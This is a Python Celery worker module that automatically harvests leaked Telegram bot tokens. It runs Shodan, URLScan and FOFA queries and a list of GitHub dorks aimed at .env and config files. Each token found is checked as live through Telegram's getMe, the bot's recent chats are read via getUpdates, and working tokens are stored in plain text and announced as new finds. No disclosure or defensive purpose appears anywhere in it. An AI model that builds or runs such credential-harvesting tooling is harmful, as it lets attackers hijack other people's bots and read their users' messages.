from app.workers.celery_app import app
import asyncio # Ensure asyncio is imported
import random
from app.core.config import settings
# from app.services.broadcaster_srv import broadcaster_service # REMOVED Global instance
from app.services.scanners import ShodanService, GithubService, UrlScanService, FofaService
from app.core.security import security
from app.core.database import db
import hashlib
import logging

# Configure Task Logger
logger = logging.getLogger("scanner.tasks")
logger.setLevel(logging.INFO)

# Instantiate services
shodan = ShodanService()
github = GithubService()
urlscan = UrlScanService()
fofa = FofaService()  # Re-enabled for aggressive local deployment

def _calculate_hash(token: str) -> str:
    return hashlib.sha256(token.encode()).hexdigest()

async def _save_credentials_async(results, source_name: str):
    """
    Validates token format and checks if bot is active via Telegram Bot API.
    Saves if token passes format check AND getMe - does NOT require chats.
    """
    import requests
    from app.services.scanners import _is_valid_token
    
    saved_count = 0
    logger.info(f"🔍 [Batch] Validating {len(results)} potential credentials from {source_name}...")

    for item in results:
        token = item.get("token")
        if not token or token == "MANUAL_REVIEW_REQUIRED":
            continue
        
        # Step 1: Validate token format (reject Fernet/hashes)
        if not _is_valid_token(token):
            logger.debug(f"    ❌ [Validate] Invalid format: {token[:15]}...")
            continue
        
        token_hash = _calculate_hash(token)
        existing_id = None
        existing_has_chat = False
        
        # Check if the result already has a chat_id (From URL/DeepScan extraction)
        extracted_chat_id = item.get("chat_id")
        
        try:
            # Step 2: Check if already exists
            existing = db.table("discovered_credentials").select("id, chat_id").eq("token_hash", token_hash).execute()
            if existing.data:
                existing_id = existing.data[0]['id']
                existing_has_chat = existing.data[0].get('chat_id') is not None
                if existing_has_chat:
                    logger.debug(f"    ⏭️ [Validate] Token {token[:10]}... already exists with chat_id.")
                    continue  # Skip - already has chat_id
                logger.info(f"    🔄 [Validate] Token exists (ID: {existing_id}) but missing chat_id. Checking for updates...")
            
            # Step 3: Validate token with Telegram getMe API (NO CHAT REQUIRED)
            # logger.debug(f"    [Validate] calling getMe for {token[:15]}...")
            
            base_url = f"https://api.telegram.org/bot{token}"
            me_res = requests.get(f"{base_url}/getMe", timeout=10)
            
            if me_res.status_code != 200 or not me_res.json().get('ok'):
                logger.debug(f"    ❌ [Validate] Token invalid or revoked (HTTP {me_res.status_code})")
                continue
            
            bot_info = me_res.json().get('result', {})
            bot_username = bot_info.get('username', 'unknown')
            logger.info(f"    ✅ [Validate] Token VALID! Bot: @{bot_username} (ID: {bot_info.get('id')})")
            
            # Step 4: Try to get a chat_id (Priority: Extracted -> API -> None)
            chat_id = extracted_chat_id
            chat_name = None
            chat_type = None

            if chat_id:
                logger.info(f"    📍 [Validate] Using extracted chat_id: {chat_id}")
            else:
                # Try to fetch via API if we didn't extract one
                try:
                    updates_res = requests.get(f"{base_url}/getUpdates", params={'limit': 10}, timeout=10)
                    if updates_res.status_code == 200 and updates_res.json().get('ok'):
                        updates = updates_res.json().get('result', [])
                        for update in updates:
                            for key in ['message', 'channel_post', 'my_chat_member']:
                                if key in update and update[key].get('chat'):
                                    chat = update[key]['chat']
                                    chat_id = chat.get('id')
                                    chat_name = chat.get('title') or chat.get('username') or chat.get('first_name')
                                    chat_type = chat.get('type')
                                    break
                            if chat_id:
                                logger.info(f"    🕵️ [Validate] Discovered chat_id via getUpdates: {chat_name} ({chat_id})")
                                break
                except Exception as e:
                    logger.warning(f"    ⚠️ [Validate] getUpdates check failed: {e}")
            
            # Step 5: Save to DB (INSERT new or UPDATE existing if we have chat_id)
            
            if existing_id and chat_id:
                # UPDATE existing record with new chat_id
                update_data = {
                    "chat_id": chat_id,
                    "status": "active",
                    "meta": {
                        **item.get("meta", {}),
                        "bot_username": bot_username,
                        "bot_id": bot_info.get('id'),
                        "chat_name": chat_name,
                        "chat_type": chat_type,
                        "extracted_chat_id": extracted_chat_id # Log that we found it via scan
                    }
                }
                db.table("discovered_credentials").update(update_data).eq("id", existing_id).execute()
                logger.info(f"    💾 [DB] UPDATED Credential ID: {existing_id} with new chat_id!")
                
                # Local instantiation for logging
                from app.services.broadcaster_srv import BroadcasterService
                broadcaster = BroadcasterService()
                await broadcaster.send_log(
                    f"🔄 [{source_name}] **Updated Token!**\n"
                    f"Bot: @{bot_username}\n"
                    f"ID: `{existing_id}`\n"
                    f"Chat: {chat_name or chat_id} ({chat_type or 'extracted'})"
                )
                saved_count += 1
            elif existing_id and not chat_id:
                # Token exists, still no chat - skip
                pass
            else:
                # INSERT new record
                data = {
                    "bot_token": token,  # Store in plain text
                    "token_hash": token_hash,
                    "chat_id": chat_id,
                    "source": source_name,
                    "status": "pending" if not chat_id else "active",
                    "meta": {
                        **item.get("meta", {}),
                        "bot_username": bot_username,
                        "bot_id": bot_info.get('id'),
                        "chat_name": chat_name,
                        "chat_type": chat_type
                    }
                }
                
                res = db.table("discovered_credentials").insert(data).execute()
                
                if res.data:
                    new_id = res.data[0]['id']
                    status_label = "✅ ACTIVE" if chat_id else "⏳ PENDING"
                    logger.info(f"    💾 [DB] INSERTED New Credential: {new_id} ({status_label})")
                    
                    # Local instantiation for logging
                    from app.services.broadcaster_srv import BroadcasterService
                    broadcaster = BroadcasterService()
                    await broadcaster.send_log(
                        f"🎯 [{source_name}] **New Bot Token!**\n"
                        f"Bot: @{bot_username}\n"
                        f"ID: `{new_id}`\n"
                        f"Status: {status_label}"
                    )
                    saved_count += 1
                
        except Exception as e:
            logger.error(f"    ❌ [Validate] Error processing token: {str(e)}")
            pass
    
    logger.info(f"✅ [Batch] Finished. Saved/Updated {saved_count} credentials.")
    return saved_count

def _save_credentials(results, source_name: str):
    """Sync wrapper for async save logic"""
    loop = asyncio.get_event_loop()
    if loop.is_closed():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    return loop.run_until_complete(_save_credentials_async(results, source_name))

def _send_log_sync(message: str):
    """Sync wrapper to send logs via broadcaster."""
    loop = asyncio.get_event_loop()
    if loop.is_closed():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    
    # Local instantiation for logging
    from app.services.broadcaster_srv import BroadcasterService
    broadcaster = BroadcasterService()
    loop.run_until_complete(broadcaster.send_log(message))

@app.task(name="scanner.scan_shodan")
def scan_shodan(query: str = None, country_code: str = None):
    import time
    
    # Full query list matching manual_scrape.py
    COMMON_QUERIES = [
        "api.telegram.org/bot",
        "bot_token",
        "TELEGRAM_BOT_TOKEN",
        "TELEGRAM_TOKEN",
        "Telegram Bot",
        "https://api.telegram.org"
    ]
    
    default_queries = [f'http.html:"{q}"' for q in COMMON_QUERIES]
    default_queries.extend([
        "http.title:\"Telegram Bot\"",
        "http.title:\"Telegram Login\""
    ])
    
    queries = [query] if query else default_queries

    # Country Logic
    selected_country = country_code
    if country_code == "RANDOM":
        selected_country = random.choice(settings.TARGET_COUNTRIES)
        logger.info(f"    [Shodan] Randomly selected country: {selected_country}")

    logger.info(f"🌎 [Shodan] Starting Scan | Queries: {len(queries)} | Country: {selected_country or 'Global'}")
    _send_log_sync(f"🌎 [Shodan] Starting scan with {len(queries)} queries (Country: {selected_country})...")
    
    total_saved = 0
    errors = []

    for q in queries:
        try:
            logger.info(f"    🔎 [Shodan] Executing query: {q}")
            results = shodan.search(q, country_code=selected_country)
            logger.info(f"    ✅ [Shodan] Query returned {len(results)} raw results.")
            
            saved = _save_credentials(results, "shodan")
            total_saved += saved
            time.sleep(1) # Rate limit respect
        except Exception as e:
            logger.error(f"    ❌ [Shodan] Query failed: {str(e)}")
            errors.append(str(e))
            
    result_msg = f"Shodan scan finished. Saved {total_saved} new credentials."
    if errors:
        result_msg += f" (Errors: {len(errors)})"
        _send_log_sync(f"❌ [Shodan] Completed with errors: {errors[0]}...")

    logger.info(f"🏁 [Shodan] Finished | Total Saved: {total_saved} | Errors: {len(errors)}")
    _send_log_sync(f"🏁 [Shodan] Finished. Saved {total_saved} new credentials.")
    return result_msg

@app.task(name="scanner.scan_urlscan")
def scan_urlscan(query: str = None, country_code: str = None):
    import time
    
    # Full query list matching manual_scrape.py
    COMMON_QUERIES = [
        "api.telegram.org/bot",
        "bot_token",
        "TELEGRAM_BOT_TOKEN",
        "TELEGRAM_TOKEN",
        "Telegram Bot",
        "https://api.telegram.org"
    ]
    
    queries = [query] if query else COMMON_QUERIES
    
    # Country Logic
    selected_country = country_code
    if country_code == "RANDOM":
        selected_country = random.choice(settings.TARGET_COUNTRIES)
        logger.info(f"    [URLScan] Randomly selected country: {selected_country}")
        
    logger.info(f"🔍 [URLScan] Starting Scan | Queries: {len(queries)} | Country: {selected_country or 'Global'}")
    _send_log_sync(f"🔍 [URLScan] Starting scan with {len(queries)} queries (Country: {selected_country})")
    
    total_saved = 0
    errors = []
    
    for q in queries:
        try:
            logger.info(f"    🔎 [URLScan] Query: {q}")
            results = urlscan.search(q, country_code=selected_country)
            logger.info(f"    ✅ [URLScan] Returned {len(results)} results.")
            
            saved = _save_credentials(results, "urlscan")
            total_saved += saved
            time.sleep(2)  # Rate limit protection
        except Exception as e:
            logger.error(f"    ❌ [URLScan] Query failed: {e}")
            errors.append(str(e))
    
    result_msg = f"URLScan scan finished. Saved {total_saved} new credentials."
    if errors:
        result_msg += f" (Errors: {len(errors)})"
        
    logger.info(f"🏁 [URLScan] Finished | Saved: {total_saved} | Errors: {len(errors)}")
    _send_log_sync(f"🏁 [URLScan] Finished. Saved {total_saved} new credentials.")
    return result_msg

@app.task(name="scanner.scan_github")
def scan_github(query: str = None):
    import time
    import random
    default_dorks = [
        # Configuration Files
        "filename:.env \"TELEGRAM_BOT_TOKEN\"",
        "filename:.env \"TG_BOT_TOKEN\"", 
        "filename:.env \"api.telegram.org\"",
        "filename:config.json \"bot_token\"",
        "filename:settings.py \"TELEGRAM_TOKEN\"",
        "filename:config.yaml \"telegram_token\"",
        "filename:config.toml \"telegram_token\"",
        "filename:docker-compose.yml \"TELEGRAM_BOT_TOKEN\"",
        
        # Code Patterns
        "language:python \"ApplicationBuilder\" \"token\"",
        "language:javascript \"new TelegramBot\" \"token\"",
        "language:php \"TelegramBot\" \"api_key\"",
        "language:go \"NewBotAPI\"",
        
        # Strings
        "\"https://api.telegram.org/bot\" -filename:README.md -filename:dataset", # Exclude common non-key files
        "\"123456789:\" NOT 123456789", # Try to find tokens that start with digits but aren't example ones
        
        # Specific Variable Names
        "\"TELEGRAM_KEY\"",
        "\"BOT_TOKEN\""
    ]
    
    if query:
        queries = [query]
    else:
        # Run ALL dorks (matching manual_scrape.py)
        queries = default_dorks
        
    total_saved = 0
    errors = []

    logger.info(f"🐱 [GitHub] Starting scan with {len(queries)} dorks...")
    _send_log_sync(f"🐱 [GitHub] Starting scan with {len(queries)} dorks (Full sweep)...")

    for q in queries:
        logger.info(f"    🔎 [GitHub] Dorking: {q}")
        print(f"Executing GitHub Dork: {q}")
        try:
            results = github.search(q)
            logger.info(f"    ✅ [GitHub] Dork returned {len(results)} matches.")
            
            saved = _save_credentials(results, "github")
            total_saved += saved
            print(f"  > Found {len(results)} matches, saved {saved} new.")
        except Exception as e:
            logger.error(f"    ❌ [GitHub] Dork failed: {str(e)}")
            print(f"  > Error: {e}")
            errors.append(str(e))
        
            time.sleep(5) 
            
    if errors:
         logger.warning(f"⚠️ [GitHub] Completed with {len(errors)} errors.") 

    result_msg = f"GitHub scan finished. Saved {total_saved} unique credentials."
    if errors:
        result_msg += f" (Encountered {len(errors)} errors)"
    _send_log_sync(f"🏁 [GitHub] Finished. Saved {total_saved} unique credentials.")
    return result_msg

# scan_censys REMOVED - Censys API access issues
# scan_hybrid REMOVED - Hybrid Analysis API access issues


@app.task(name="scanner.scan_fofa", bind=True, max_retries=2)
def scan_fofa(self, query: str = None, country_code: str = None):
    """
    Celery task to scan FOFA for exposed Telegram bots.
    FOFA is a Chinese search engine similar to Shodan.
    """
    import time
    
    # Full query list for FOFA
    COMMON_QUERIES = [
        'body="api.telegram.org/bot"',
        'body="bot_token"',
        'body="TELEGRAM_BOT_TOKEN"',
        'title="Telegram Bot"',
        'body="sendMessage" && body="chat_id"',
    ]
    
    queries = [query] if query else COMMON_QUERIES
    
    # Country Logic
    selected_country = country_code
    if country_code == "RANDOM":
        selected_country = random.choice(settings.TARGET_COUNTRIES)
        logger.info(f"    [FOFA] Randomly selected country: {selected_country}")
    
    logger.info(f"🔍 [FOFA] Starting Scan | Queries: {len(queries)} | Country: {selected_country or 'Global'}")
    _send_log_sync(f"🔍 [FOFA] Starting scan with {len(queries)} queries (Country: {selected_country})...")
    
    total_saved = 0
    errors = []
    
    for q in queries:
        try:
            logger.info(f"    🔎 [FOFA] Executing query: {q}")
            results = fofa.search(query=q, country_code=selected_country)
            logger.info(f"    ✅ [FOFA] Query returned {len(results)} raw results.")
            
            saved = _save_credentials(results, "fofa")
            total_saved += saved
            time.sleep(2)  # Rate limit respect
        except Exception as e:
            logger.error(f"    ❌ [FOFA] Query failed: {str(e)}")
            errors.append(str(e))
            if self.request.retries < self.max_retries:
                raise self.retry(exc=e, countdown=60)
    
    result_msg = f"FOFA scan finished. Saved {total_saved} new credentials."
    if errors:
        result_msg += f" (Errors: {len(errors)})"
        _send_log_sync(f"❌ [FOFA] Completed with errors: {errors[0]}...")
    else:
        _send_log_sync(f"🏁 [FOFA] Finished. Saved {total_saved} new credentials.")
    
    logger.info(f"🏁 [FOFA] Finished | Total Saved: {total_saved} | Errors: {len(errors)}")
    return result_msg
